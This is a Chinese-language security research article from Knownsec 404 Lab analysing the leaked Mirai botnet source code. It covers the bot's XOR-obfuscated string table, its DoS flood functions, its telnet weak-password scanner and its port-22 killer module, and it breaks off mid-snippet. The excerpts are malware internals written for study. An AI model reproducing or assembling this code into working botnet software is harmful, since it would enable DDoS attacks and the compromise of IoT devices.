Author: **xd0ol1 (知道创宇404实验室)**
## 1\. 背景概述
最近的德国断网事件让Mirai恶意程序再次跃入公众的视线，相对而言，目前的IoT领域对于恶意程序还是一片蓝海，因此吸引了越来越多的人开始涉足这趟征程。而作为安全研究者，我们有必要对此提高重视，本文将从另一角度，即以Mirai泄露的源码为例来小窥其冰山一角。
## 2\. 源码分析
选此次分析的Mirai源码（https://github.com/jgamblin/Mirai-Source-Code
）主要包含loader、payload(bot)、cnc和tools四部分内容：
    loader/src   将payload上传到受感染的设备
    mirai/bot    在受感染设备上运行的恶意payload
    mirai/cnc    恶意者进行控制和管理的接口
    mirai/tools  提供的一些工具
其中，cnc部分是Go语言编写的，余下都由C语言编码完成。我们知道payload是在受害者设备上直接运行的那部分恶意代码，而loader的作用就是将其drop到这些设备上，比如宏病毒、js下载者等都属于loader的范畴。对恶意开发者来说，最关键的也就是设计好loader和payload的功能，毕竟这与恶意操作能否成功息息相关，同时它们也是和受害者直接接触的那部分代码，因此这里的分析重点将集中在这两部分代码上，剩下的cnc和tools只做个概要分析。在详细分析之前，我们先给出Mirai对应的网络拓扑关系图，可以有个直观的认识：
### 2.1 payload分析
这部分代码的主要功能是发起DoS攻击以及扫描其它可能受感染的设备，代码在mirai/bot目录，可简单划分为如下几个模块：
我们首先看一下public模块，主要是一些常用的公共函数，供其它几个模块调用：
    /******checksum.c******
    *构造数据包原始套接字时会用到校验和的计算
    */
    //计算数据包ip头中的校验和
    uint16_t checksum_generic(uint16_t *, uint32_t);
    //计算数据包tcp头中的校验和
    uint16_t checksum_tcpudp(struct iphdr *, void *, uint16_t, int);
    /******rand.c******/
    //初始化随机数因子
    void rand_init(void);
    //生成一个随机数
    uint32_t rand_next(void);
    //生成特定长度的随机字符串
    void rand_str(char *, int);
    //生成包含数字字母的特定长度的随机字符串
    void rand_alphastr(uint8_t *, int);
    /******resolv.c******
    *处理域名的解析，参考DNS报文格式
    */
    //域名按字符'.'进行划分，并保存各段长度，构造DNS请求包时会用到
    void resolv_domain_to_hostname(char *, char *);
    //处理DNS响应包中的解析结果，可参照DNS数据包结构
    static void resolv_skip_name(uint8_t *reader, uint8_t *buffer, int *count);
    //构造DNS请求包向8.8.8.8进行域名解析，并获取响应包中的IP
    struct resolv_entries *resolv_lookup(char *);
    //释放用来保存域名解析结果的空间
    void resolv_entries_free(struct resolv_entries *);
    /******table.c******
    *处理硬编码在table中的数据
    */
    //初始化table中的成员
    void table_init(void);
    //解密table中对应id的成员
    void table_unlock_val(uint8_t id);
    //加密table中对应id的成员
    void table_lock_val(uint8_t id);
    //取出table中对应id的成员
    char *table_retrieve_val(int id, int *len);
    //向table中添加成员
    static void add_entry(uint8_t id, char *buf, int buf_len);
    //和密钥key进行异或操作，即table中数据的加密或解密
    static void toggle_obf(uint8_t id);
    /******util.c******/
    ......
    //在内存中查找特定的字节序
    int util_memsearch(char *buf, int buf_len, char *mem, int mem_len);
    //在具体字符串中查找特定的子字符串，忽略大小写
    int util_stristr(char *haystack, int haystack_len, char *str);
    //获取本地ip信息
    ipv4_t util_local_addr(void);
    //读取描述符fd对应文件中的字符串
    char *util_fdgets(char *buffer, int buffer_size, int fd);
    ......
其中，用的比较多的有rand.c中的`rand_next`函数，即生成一个整型随机数，以及table.c中的`table_unlock_val`、`table_retrieve_val`和
`table_lock_val`
函数组合，即获取table中的数据，程序中用到的一些信息是硬编码后保存到table中的，如果获取就要用到这个组合，其中涉及到简单的异或加密和解密，这里举个例子：
    //保存到table中的硬编码信息
    add_entry(TABLE_EXEC_SUCCESS, "\x4E\x4B\x51\x56\x47\x4C\x4B\x4C\x45\x02\x56\x57\x4C\x12\x22", 15);
    //调用table_unlock_val解密
    //初始化key，其中table_key = 0xdeadbeef;
    uint8_t k1 = table_key & 0xff,         //0xef
            k2 = (table_key >> 8) & 0xff,  //0xbe
            k3 = (table_key >> 16) & 0xff, //0xad
            k4 = (table_key >> 24) & 0xff; //0xde
    //循环异或
    for (i = 0; i val_len; i++)
    {
        val->val[i] ^= k1;
        val->val[i] ^= k2;
        val->val[i] ^= k3;
        val->val[i] ^= k4;
    }
    /*解密后的信息：listening tun0
    *这时调用table_retrieve_val就可以获取到所需信息
    *最后调用table_lock_val加密，同table_unlock_val调用，利用的是两次异或后结果不变的性质
    *不过考虑到异或的交换律和结合律，上述操作实际上也就相当于各字节异或一次0x22
    */
接着来看attack模块，此模块的作用就是解析下发的攻击命令并发动DoS攻击，attack.c中主要就是下述两个函数：
    /******attack.c******/
    //按照事先约定的格式解析下发的攻击命令，即取出攻击参数
    void attack_parse(char *buf, int len);
    //调用相应的DoS攻击函数
    void attack_start(int duration, ATTACK_VECTOR vector, uint8_t targs_len, struct attack_target *targs, 
        uint8_t opts_len, struct attack_option *opts)
    {
        ......
        else if (pid2 == 0)
        {
            //父进程DoS持续时间到了后由子进程负责kill掉
            sleep(duration);
            kill(getppid(), 9);
            exit(0);
        }
        ......
                if (methods[i]->vector == vector)
                {
    #ifdef DEBUG
                    printf("[attack] Starting attack...\n");
    #endif
                    //C语言函数指针实现的C++多态
                    methods[i]->func(targs_len, targs, opts_len, opts);
                    break;
                }
            }
        ......
        }
    }
而attack_app.c、attack_gre.c、attack_tcp.c和attack_udp.c中实现了具体的DoS攻击函数：
    /*1)Straight up UDP flood  2)Valve Source Engine query flood
    * 3)DNS water torture  4)Plain UDP flood optimized for speed
    */
    void attack_udp_generic(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
    void attack_udp_vse(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
    void attack_udp_dns(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
    void attack_udp_plain(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
    /*1)SYN flood with options  2)ACK flood
    * 3)ACK flood to bypass mitigation devices
    */
    void attack_tcp_syn(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
    void attack_tcp_ack(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
    void attack_tcp_stomp(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
    // 1)GRE IP flood  2)GRE Ethernet flood
    void attack_gre_ip(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
    void attack_gre_eth(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
    // HTTP layer 7 flood
    void attack_app_http(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
可以看到这里设计的函数接口是统一的，因而可以定义如下函数指针，通过这种方式就可以实现和C++多态同样的功能，方便进行扩展：
    typedef void (*ATTACK_FUNC) (uint8_t, struct attack_target *, uint8_t, struct attack_option *);
实际上attack这个模块是可以完整剥离出来的，只需在attack_parse或attack_start函数上加一层封装就可以了，要加入其它DoS攻击函数只需符合ATTACK_FUNC的接口即可。
再来看scanner模块，其功能就是扫描其它可能受感染的设备，如果能满足telnet弱口令登录则将结果进行上报，恶意者主要借此扩张僵尸网络，scanner.c中的主要函数如下：
    /******scanner.c******/
    //将接收到的空字符替换为'A'
    int recv_strip_null(int sock, void *buf, int len, int flags);
    //首先生成随机ip，而后随机选择字典中的用户名密码组合进行telnet登录测试
    void scanner_init(void);
    //如果扫描的随机ip有回应，则建立正式连接
    static void setup_connection(struct scanner_connection *conn);
    //获取随机ip地址，特殊ip段除外
    static ipv4_t get_random_ip(void);
    //向auth_table中添加字典数据
    static void add_auth_entry(char *enc_user, char *enc_pass, uint16_t weight);
    //随机返回一条auth_table中的记录
    static struct scanner_auth *random_auth_entry(void);
    //上报成功的扫描结果
    static void report_working(ipv4_t daddr, uint16_t dport, struct scanner_auth *auth);
    //对字典中的字符串进行异或解密
    static char *deobf(char *str, int *len);
为了提高扫描效率，程序对随机生成的IP会先通过构造的原始套接字进行试探性连接，如果有回应才进行后续的telnet登录测试，而这个交互过程和后面的loader与感染节点建立telnet交互后上传恶意payload文件有重复，因此这里就不展开了，可以参考后面的分析。此外，弱口令字典同样采用了硬编码的方式，解密也是采用的异或操作，这和前面table.c中的情形是相似的，也不赘述了。
最后我们来看下kill模块，此模块主要有两个作用，其一是关闭特定的端口并占用，另一是删除特定文件并kill对应进程，简单来说就是排除异己。我们看下其中kill掉22端口的代码：
    /******kill.c******/
        ......
        //查找特定端口对应的的进程并将其kill掉
        if (killer_kill_by_port(htons(22)))
        {
    #ifdef DEBUG
            printf("[killer] Killed tcp/22 (SSH)\n");
    #endif
        }
        //通过bind进行端口占用
        tmp_bind_addr.sin_port = htons(22);
        if ((tmp_bind_fd = socket(AF_INET, SOCK_STREAM, 0)) != -1)
        {
            bind(tmp_bind_fd, (struct sockaddr *)&tmp_bind_addr, sizeof (struct sockaddr_in));
            listen(tmp_bind_fd, 1);